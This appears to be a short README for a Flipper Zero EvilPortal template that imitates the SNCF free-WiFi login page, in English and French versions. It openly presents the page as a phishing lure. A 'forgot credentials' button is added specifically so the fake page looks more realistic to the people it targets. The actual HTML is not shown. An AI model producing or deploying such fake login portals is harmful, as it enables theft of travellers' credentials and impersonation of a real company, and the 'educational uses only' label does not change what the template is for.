# !!FOR EDUCATIONAL USES ONLY!!
This one **emulates a portal for an SNCF "Free Hotspot"** using EvilPortal on your Flipper Zero.
SNCF is the French Railway company.

# I also included a French version of the portal


The **HTML in the *"WithForgotCredentials"* file** contains a **"forgot credentials" button on the user side to make it look more realistic**. This button only shows a message inviting them to go on their provider's app if they forgot their login/password.
## Happy flippin'


![SNCF WiFi](https://zupimages.net/up/23/31/wy1r.png)
